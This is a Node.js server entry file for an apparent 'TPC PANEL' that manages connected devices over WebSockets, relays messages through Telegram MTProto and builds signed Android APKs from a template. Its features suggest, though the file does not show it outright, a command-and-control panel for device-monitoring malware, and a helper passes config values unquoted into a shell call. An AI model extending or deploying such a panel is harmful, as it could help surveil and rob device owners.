"use strict";

const http = require("http");
const cluster = require("cluster");
const express = require("express");
const cookieSession = require("cookie-session");
const { WebSocketServer } = require("ws");
const fs = require("fs");
const { execSync } = require("child_process");

const config = require("./env");

// ---------------------------------------------------------- argv / flags

const argv = process.argv.slice(2);

function argValue(name) {
  const i = argv.indexOf(name);
  if (i === -1) return undefined;
  const next = argv[i + 1];
  if (!next || next.startsWith("--")) return true;
  return next;
}
const hasFlag = (n) => argv.includes(n);

const WORKER_ONLY = hasFlag("--worker");
const PROXY_HEADERS = hasFlag("--proxy-headers") || process.env.TRUST_PROXY === "1";
const WORKERS = Math.max(
  1,
  parseInt(argValue("--workers") || process.env.WEB_CONCURRENCY || "1", 10) || 1
);
const PORT = parseInt(argValue("--port") || process.env.PORT || "8000", 10);
const SPREAD = ["1", "true", "yes"].includes(
  String(process.env.CLUSTER_PORT_SPREAD || "").toLowerCase()
);

const isPrimary =
  cluster.isPrimary === undefined ? cluster.isMaster : cluster.isPrimary;
const IS_CHILD = !!process.env.TPC_CHILD;
const QUEUE_OWNER = !cluster.worker || cluster.worker.id === 1;

// queue ownership + worker mode — builder require se PEHLE decide
if (WORKER_ONLY) {
  process.env.BUILDER_WORKER_MODE = process.env.BUILDER_WORKER_MODE || "inline";
} else if (WORKERS > 1) {
  process.env.BUILDER_WORKER_MODE = process.env.BUILDER_WORKER_MODE || "api";
} else {
  process.env.BUILDER_WORKER_MODE = process.env.BUILDER_WORKER_MODE || "inline";
}
if (!QUEUE_OWNER) process.env.BUILDER_WORKER_MODE = "api";

// ---------------------------------------------------------------- modules

const db = require("./database");
const u = require("./utils");
const hub = require("./hub");
const relay = require("./relay");
const builder = require("./builder");

const devicesRoutes = require("./routes/devices");
const adminRoutes = require("./admin/admin");
const wsRoutes = require("./routes/ws");

// ----------------------------------------------------------------- helpers

const safe = async (label, fn) => {
  try {
    return await fn();
  } catch (err) {
    console.error(`[startup] ${label} fail:`, err.message || err);
    return null;
  }
};

const which = (bin) => {
  if (!bin) return null;
  try {
    const r = execSync(`command -v ${bin}`, {
      stdio: ["ignore", "pipe", "ignore"],
    });
    return r.toString().trim() || null;
  } catch (_) {
    return null;
  }
};

function dbGuard(req, res, next) {
  const p = req.path;
  if (
    p.startsWith("/api/builder/config") ||
    p.startsWith("/api/builder/preflight") ||
    p.startsWith("/api/builder/themes")
  ) {
    return next();
  }
  if (db.isReady()) return next();
  res.setHeader("Retry-After", "3");
  res.status(503).json({ detail: "Database not ready", db: db.status() });
}

// ------------------------------------------------------------------- app

function createApp() {
  const app = express();
  app.disable("x-powered-by");
  app.set("trust proxy", PROXY_HEADERS || config.TRUST_PROXY ? true : false);

  app.use(express.json({ limit: "8mb" }));
  app.use(express.urlencoded({ extended: true, limit: "8mb" }));

  app.use(
    cookieSession({
      name: config.COOKIE_NAME,
      keys: [config.SESSION_SECRET],
      maxAge: config.SESSION_MAX_AGE * 1000,
      sameSite: "lax",
      secure: config.FORCE_SECURE,
      httpOnly: true,
      domain: config.COOKIE_DOMAIN || undefined,
    })
  );

  app.use("/api", dbGuard);

  // ---------------- public ----------------
  app.get("/", (req, res) =>
    res.json({
      app: "TPC PANEL",
      status: "online",
      version: config.VERSION,
      owner: "https://t.me/icivan",
      relay: relay.TELETHON_OK ? "mtproto" : "unavailable",
      builder: builder.config.WORKER_MODE,
      pid: process.pid,
    })
  );

  app.get("/health", (req, res) =>
    res.json({
      status: db.isReady() ? "ok" : "degraded",
      version: config.VERSION,
      db: db.status(),
      devices_online: hub.hub ? hub.hub.onlineCount : 0,
      relay_authorized: !!relay.relayState.authorized,
      build_queue: builder.getQueue().stats(),
    })
  );

  app.get("/health/database", async (req, res, next) => {
    try {
      const r = await db.checkDatabase();
      if (r.status !== "ok") return res.status(503).json(r);
      res.json(r);
    } catch (e) {
      next(e);
    }
  });

  app.get("/health/builder", async (req, res, next) => {
    try {
      const tools = {
        gradle: which(builder.config.GRADLE_BIN),
        keytool: which(builder.config.KEYTOOL_BIN),
        apksigner: which(builder.config.APKSIGNER_BIN),
        zipalign: which(builder.config.ZIPALIGN_BIN),
        docker: which(builder.config.DOCKER_BIN),
      };
      const gradleOk = !!tools.gradle || builder.config.USE_DOCKER;
      const templateOk = fs.existsSync(builder.config.TEMPLATE_DIR);
      res.json({
        status: gradleOk && templateOk ? "ok" : "degraded",
        version: config.VERSION,
        variant: builder.config.DEFAULT_VARIANT,
        worker_mode: builder.config.WORKER_MODE,
        template_dir: builder.config.TEMPLATE_DIR,
        template_ok: templateOk,
        tools: Object.fromEntries(Object.entries(tools).map(([k, v]) => [k, !!v])),
        tool_paths: Object.fromEntries(Object.entries(tools).filter(([, v]) => v)),
        queue: builder.getQueue().stats(),
        counts: await db.builderStats(),
      });
    } catch (e) {
      next(e);
    }
  });

  // ---------------- admin dashboard ----------------
  const serveAdmin = (req, res, next) => {
    if (!fs.existsSync(config.ADMIN_FILE)) {
      return next(new u.HttpError(404, "Admin dashboard file not found"));
    }
    res.setHeader("Cache-Control", "no-store");
    res.sendFile(config.ADMIN_FILE);
  };
  app.get(["/admin", "/admin/", "/panel"], serveAdmin);

  // ---------------- app routes ----------------
  app.use(builder.router);
  app.use(relay.router);
  app.use("/admin/relay", relay.router);
  app.use(devicesRoutes);
  app.use(adminRoutes);

  // ---------------- errors ----------------
  app.use((req, res) => res.status(404).json({ detail: "Not found" }));
  app.use((err, req, res, _next) => {
    const status =
      err instanceof u.HttpError ? err.status : err.status || 500;
    if (status >= 500) console.error("[error]", err);
    res.status(status).json({ detail: err.message || "Server error" });
  });

  return app;
}

function attachWs(server) {
  const wss = new WebSocketServer({ noServer: true });

  server.on("upgrade", (req, socket, head) => {
    let pathname = "/";
    try {
      pathname = new URL(req.url, "http://localhost").pathname;
    } catch (_) {}

    let handler = null;
    if (pathname === "/ws/admin") handler = wsRoutes.adminSocket;
    else if (pathname.startsWith("/ws/device/")) {
      const rid = decodeURIComponent(pathname.slice("/ws/device/".length));
      handler = (ws, r) => wsRoutes.deviceSocket(ws, r, rid);
    } else if (pathname === "/ws/user")
      handler = (ws, r) => builder.userHub.userSocket(ws, r);
    else if (pathname === "/ws/app")
      handler = (ws, r) => builder.userHub.appSocket(ws, r);

    if (!handler) {
      socket.destroy();
      return;
    }
    wss.handleUpgrade(req, socket, head, (ws) => handler(ws, req));
  });

  return wss;
}

// ------------------------------------------------------------------ start

async function start() {
  await db.initDbWithRetry().catch((err) => {
    console.error("[startup] mongo connect fail — degraded mode:", err.message);
  });
  db.startWatchdog();

  await safe("backfillShortIds", () => u.backfillShortIds());
  await safe("backfillAutoSender", () => u.backfillAutoSender());
  await safe("loadBans", () => relay.loadBans());
  await safe("loadRelayConfig", () => relay.loadRelayConfig());
  await safe("startRelay", () => relay.startRelay());
  await safe("pruneEventsLoop", () => hub.spawn(hub.pruneEventsLoop()));

  try {
    builder.ensureDirs();
    builder.bindLoop();
    builder.initQueue();
    if (builder.config.WORKER_MODE === "inline") {
      await builder.getQueue().start();
    }
  } catch (err) {
    console.error("[startup] builder fail — panel chalu rahega:", err.message);
  }

  const listenPort =
    SPREAD && cluster.worker ? PORT + (cluster.worker.id - 1) : PORT;

  const server = http.createServer(createApp());
  attachWs(server);

  await new Promise((resolve) => server.listen(listenPort, resolve));

  console.log(
    `TPC PANEL v${config.VERSION} up — pid=${process.pid} port=${listenPort} ` +
      `mode=${builder.config.WORKER_MODE} admins=${Object.keys(config.ADMINS).length} ` +
      `secret=${config.SESSION_SECRET_SRC}`
  );

  let done = false;
  const shutdown = async (sig) => {
    if (done) return;
    done = true;
    console.log(`[shutdown] ${sig}`);
    try { await builder.getQueue().stop(); } catch (_) {}
    try { await relay.stopRelay(); } catch (_) {}
    try { await hub.closeSockets(); } catch (_) {}
    try { await db.closeDb(); } catch (_) {}
    server.close(() => process.exit(0));
    setTimeout(() => process.exit(0), 4000);
  };

  process.on("SIGINT", () => shutdown("SIGINT"));
  process.on("SIGTERM", () => shutdown("SIGTERM"));

  return server;
}

// ---------------------------------------------------------------- cluster

function startClusterPrimary() {
  console.log(`[cluster] primary pid=${process.pid} — ${WORKERS} workers fork`);

  const fork = () => cluster.fork({ TPC_CHILD: "1" });
  for (let i = 0; i < WORKERS; i++) fork();

  let shuttingDown = false;
  cluster.on("exit", (worker, code, signal) => {
    if (shuttingDown) return;
    console.error(`[cluster] worker ${worker.process.pid} exit (${signal || code}) — restart`);
    setTimeout(fork, 1000);
  });

  const stop = () => {
    shuttingDown = true;
    for (const id of Object.keys(cluster.workers || {})) {
      try { cluster.workers[id].process.kill("SIGTERM"); } catch (_) {}
    }
    setTimeout(() => process.exit(0), 4000);
  };
  process.on("SIGTERM", stop);
  process.on("SIGINT", stop);
}

process.on("unhandledRejection", (e) =>
  console.error("[unhandledRejection]", e && e.stack ? e.stack : e)
);
process.on("uncaughtException", (e) =>
  console.error("[uncaughtException]", e && e.stack ? e.stack : e)
);

if (!WORKER_ONLY && WORKERS > 1 && isPrimary && !IS_CHILD) {
  startClusterPrimary();
} else {
  start().catch((e) => {
    console.error("startup failed", e);
    process.exit(1);
  });
}

module.exports = { start, createApp };